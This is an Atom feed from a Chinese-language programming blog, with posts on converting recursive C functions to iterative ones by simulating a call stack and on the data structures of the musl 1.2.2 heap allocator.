<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>emmm&#39;s blog</title>
  
  
  <link href="https://h4ckf0rfun.github.io/atom.xml" rel="self"/>
  
  <link href="https://h4ckf0rfun.github.io/"/>
  <updated>2022-10-12T16:14:15.417Z</updated>
  <id>https://h4ckf0rfun.github.io/</id>
  
  <author>
    <name>emmm</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>任意递归写法转迭代写法2</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/13/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%952/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/13/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%952/</id>
    <published>2022-10-12T16:09:58.000Z</published>
    <updated>2022-10-12T16:14:15.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>感觉前面那个有点不优雅，改了一下，这次完全模拟C语言程序的栈结构，并且用两个变量pc和ret_value代表x86的eip 和 eax</p><p>新的Ctx:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Ctx</span>&#123;</span></span><br><span class="line"><span class="type">int</span> args;     <span class="comment">//参数</span></span><br><span class="line"><span class="type">int</span> vars;     <span class="comment">//局部变量</span></span><br><span class="line"><span class="type">int</span> ret_addr; <span class="comment">//返回地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在递归调用的时候模拟call 指令，为新的函数运行开辟栈空间，保存返回地址，并更改pc变量的值，当函数返回时，将返回值放到ret_value 变量中</p><h1 id="Example1-二叉树中序遍历"><a href="#Example1-二叉树中序遍历" class="headerlink" title="Example1: 二叉树中序遍历"></a>Example1: 二叉树中序遍历</h1><h2 id="递归写法"><a href="#递归写法" class="headerlink" title="递归写法:"></a>递归写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">travel_by_recursive</span><span class="params">(TreeNode*node)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">travel_by_recursive(node-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d\n&quot;</span>, node-&gt;val);</span><br><span class="line">travel_by_recursive(node-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="迭代写法"><a href="#迭代写法" class="headerlink" title="迭代写法:"></a>迭代写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctx</span>&#123;</span></span><br><span class="line">TreeNode*node;<span class="comment">//传递给当前函数的参数.</span></span><br><span class="line"><span class="type">int</span> vars;<span class="comment">//局部变量,当前函数内的</span></span><br><span class="line"><span class="type">int</span> ret_addr;<span class="comment">//控制下一行代码.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">travel</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span>&#123;</span><br><span class="line"><span class="built_in">stack</span>&lt;ctx&gt; s;</span><br><span class="line"><span class="type">int</span> pc, ret_value;</span><br><span class="line"><span class="comment">//第一次调用</span></span><br><span class="line">s.push(&#123; root, <span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line">ret_value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!s.empty())&#123;</span><br><span class="line"><span class="comment">//执行当前函数内(ctx)的代码:</span></span><br><span class="line"><span class="keyword">auto</span> &amp; t = s.top();</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (pc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> (t.node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">pc = t.ret_addr;</span><br><span class="line">s.pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">pc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">s.push(&#123; t.node-&gt;left, <span class="number">0</span>, pc + <span class="number">1</span>&#125;);<span class="comment">//travel_by_recursive(node-&gt;left);</span></span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d&quot;</span>, t.node-&gt;val);<span class="comment">//printf(&quot;val:%d\n&quot;, node-&gt;val);</span></span><br><span class="line">pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">s.push(&#123; t.node-&gt;right, <span class="number">0</span>, pc + <span class="number">1</span>&#125;);<span class="comment">//travel_by_recursive(node-&gt;right);</span></span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">pc = t.ret_addr;<span class="comment">//函数返回.</span></span><br><span class="line">s.pop();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Example2-分治法求无序数组中的最大值"><a href="#Example2-分治法求无序数组中的最大值" class="headerlink" title="Example2: 分治法求无序数组中的最大值"></a>Example2: 分治法求无序数组中的最大值</h1><h2 id="递归写法-1"><a href="#递归写法-1" class="headerlink" title="递归写法:"></a>递归写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_max_by_recursive</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (left == right || (right - left) == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> max(arr[left], arr[right]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> left_m = get_max_by_recursive(arr, left, (left + right) / <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> right_m = get_max_by_recursive(arr, (left + right) / <span class="number">2</span> + <span class="number">1</span>, right);</span><br><span class="line"><span class="keyword">return</span> max(left_m, right_m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="迭代写法-1"><a href="#迭代写法-1" class="headerlink" title="迭代写法:"></a>迭代写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;感觉前面那个有点不优雅，改了一下，这次完全模拟C语言程序的栈结构，并且用两个变量pc和ret_value代表x86的eip 和 eax&lt;/p</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>musl1.2.2堆管理机制-(3)free总览</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-3-free%E6%80%BB%E8%A7%88/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-3-free%E6%80%BB%E8%A7%88/</id>
    <published>2022-10-12T10:51:40.000Z</published>
    <updated>2022-10-12T10:52:14.668Z</updated>
    
    <content type="html"><![CDATA[<h1 id="free-流程总览"><a href="#free-流程总览" class="headerlink" title="free 流程总览"></a>free 流程总览</h1><p><img src="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-3-free%E6%80%BB%E8%A7%88/free.svg" alt="free.svg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;free-流程总览&quot;&gt;&lt;a href=&quot;#free-流程总览&quot; class=&quot;headerlink&quot; title=&quot;free 流程总览&quot;&gt;&lt;/a&gt;free 流程总览&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/202</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>musl1.2.2堆管理机制-(2)malloc总览</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-2-malloc%E6%80%BB%E8%A7%88/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-2-malloc%E6%80%BB%E8%A7%88/</id>
    <published>2022-10-12T10:48:54.000Z</published>
    <updated>2022-10-12T10:50:14.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="malloc-流程总览"><a href="#malloc-流程总览" class="headerlink" title="malloc 流程总览"></a>malloc 流程总览</h1><p><img src="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-2-malloc%E6%80%BB%E8%A7%88/malloc.svg" alt="malloc.svg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;malloc-流程总览&quot;&gt;&lt;a href=&quot;#malloc-流程总览&quot; class=&quot;headerlink&quot; title=&quot;malloc 流程总览&quot;&gt;&lt;/a&gt;malloc 流程总览&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.githu</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>musl1.2.2堆管理机制-(1)</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-1/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-1/</id>
    <published>2022-10-12T10:44:01.000Z</published>
    <updated>2022-10-12T10:44:41.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-basic-data-structure"><a href="#1-basic-data-structure" class="headerlink" title="1. basic data structure"></a>1. basic data structure</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"><span class="type">uint8_t</span> flag;        <span class="comment">//</span></span><br><span class="line"><span class="type">uint8_t</span> idx:<span class="number">5</span>;       <span class="comment">//在当前group 中的索引</span></span><br><span class="line"><span class="type">uint8_t</span> reversed:<span class="number">3</span>;  <span class="comment">//</span></span><br><span class="line"><span class="type">uint16_t</span>offset;    <span class="comment">//UserData 距离 group-&gt; storage的偏移.</span></span><br><span class="line"><span class="type">char</span> UserData[];     <span class="comment">//保存用户数据.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//每个group 开头的数据,一共16 个字节.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;     <span class="comment">//active idx 有可能是小于last_idx的.</span></span><br><span class="line"><span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>]; <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//后面这些用来放chunk</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line"><span class="comment">//同一个active 里面保存的metas通过双向循环链表连接起来.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, </span></span><br><span class="line"><span class="class">*<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span>  <span class="comment">//指向group.</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> avail_mask,<span class="comment">//bitmap ,标记哪个chunk 是有效的. </span></span><br><span class="line">freed_mask;      <span class="comment">//bitmap ,标记哪个chunk 被释放了. </span></span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;  <span class="comment">//记录最后一个chunk的idx</span></span><br><span class="line"><span class="type">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">//所属的size class (是个index..)</span></span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一个meta_area中可以分配出多个meta.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> check;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">int</span> nslots;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> secret;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line"><span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> init_done;    <span class="comment">//初始化 secret.</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> mmap_counter;<span class="comment">//记录mmap的个数</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">//保存free 的meta</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span> <span class="comment">//这个是保存当前area中剩余未使用的部分</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> avail_meta_count,  <span class="comment">//这个是用来保存当前area中剩余的meta的个数...</span></span><br><span class="line"></span><br><span class="line">avail_meta_area_count, meta_alloc_shift;</span><br><span class="line"><span class="comment">//这个链表用来保存使用的area</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line"><span class="comment">//这个是用来保存未使用的areas区域 (.bss段后面未使用的)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span>  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> usage_by_class[<span class="number">48</span>];<span class="comment">//创建出来的group所包含的chunk总个数,</span></span><br><span class="line"><span class="comment">//包括被free的chunk和被alloc的chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line"><span class="type">uint8_t</span> seq;</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> brk;                  <span class="comment">//bss 段结尾.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大体的内存布局:</p><p><img src="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-1/Untitled.svg" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-basic-data-structure&quot;&gt;&lt;a href=&quot;#1-basic-data-structure&quot; class=&quot;headerlink&quot; title=&quot;1. basic data structure&quot;&gt;&lt;/a&gt;1. basic data struc</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>任意递归写法转迭代写法</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/12/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%95/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%95/</id>
    <published>2022-10-12T06:10:58.000Z</published>
    <updated>2022-10-12T06:14:42.510Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h1><p>想到一种通用的解法，直接模拟x86下c语言程序栈结构去执行。</p><p>先看一下x86下c语言函数的栈结构:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------</span><br><span class="line"></span><br><span class="line">局部变量</span><br><span class="line"></span><br><span class="line">--------</span><br><span class="line">返回地址</span><br><span class="line">--------</span><br><span class="line">调用者传递的参数</span><br><span class="line">--------</span><br></pre></td></tr></table></figure><p>其中返回值一般保存在eax (如果能保存下来的话)，eip控制下一条指令的地址。我们这里简化一下，用下面的结构体，我将其命名为 Ctx (当前函数的上下文)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Ctx</span>&#123;</span></span><br><span class="line"><span class="type">int</span> args;           <span class="comment">//当前函数的参数</span></span><br><span class="line"><span class="type">int</span> vars;           <span class="comment">//当前函数的局部变量.</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> return_val;     <span class="comment">//保存当前函数调用其他函数时的返回值</span></span><br><span class="line"><span class="type">int</span> pc;             <span class="comment">//控制当前函数下一句执行的代码，相当于给每一个函数一个eip寄存器</span></span><br><span class="line"><span class="comment">//所以我们就不需要保存返回地址了.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Example1：二叉树的中序遍历"><a href="#Example1：二叉树的中序遍历" class="headerlink" title="Example1：二叉树的中序遍历"></a>Example1：二叉树的中序遍历</h1><h2 id="递归的写法"><a href="#递归的写法" class="headerlink" title="递归的写法:"></a>递归的写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">travel_by_recursive</span><span class="params">(TreeNode*node)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">travel_by_recursive(node-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d\n&quot;</span>, node-&gt;val);</span><br><span class="line">travel_by_recursive(node-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="迭代的写法"><a href="#迭代的写法" class="headerlink" title="迭代的写法:"></a>迭代的写法:</h2><p>先定义一个ctx:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctx</span>&#123;</span></span><br><span class="line">TreeNode*node;<span class="comment">//传递给当前函数的参数.</span></span><br><span class="line"><span class="type">int</span> vars;      <span class="comment">//局部变量,当前函数内的，这个例子没有用到</span></span><br><span class="line"><span class="type">int</span> return_val;<span class="comment">//临时变量,保存某个函数调用时的返回值.这个例子没有用到.</span></span><br><span class="line"><span class="type">int</span> pc;    <span class="comment">//控制下一行代码.</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后照着上面的递归写法转换:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">travel</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">stack</span>&lt;ctx&gt; s;</span><br><span class="line">s.push(&#123; root, <span class="number">0</span>, <span class="number">0</span>,<span class="number">0</span> &#125;);</span><br><span class="line"><span class="keyword">while</span> (!s.empty())&#123;</span><br><span class="line"><span class="comment">//执行当前函数内(ctx)的代码:</span></span><br><span class="line"><span class="keyword">auto</span> &amp; t = s.top();</span><br><span class="line"><span class="keyword">switch</span> (t.pc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> (t.node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">s.pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">t.pc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//travel_by_recursive(node-&gt;left);</span></span><br><span class="line">s.push(&#123; t.node-&gt;left, <span class="number">0</span>, <span class="number">0</span> ,<span class="number">0</span>&#125;);<span class="comment">//pc初始化为0.</span></span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//printf(&quot;val:%d\n&quot;, node-&gt;val);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d&quot;</span>, t.node-&gt;val);</span><br><span class="line">t.pc++;</span><br><span class="line"><span 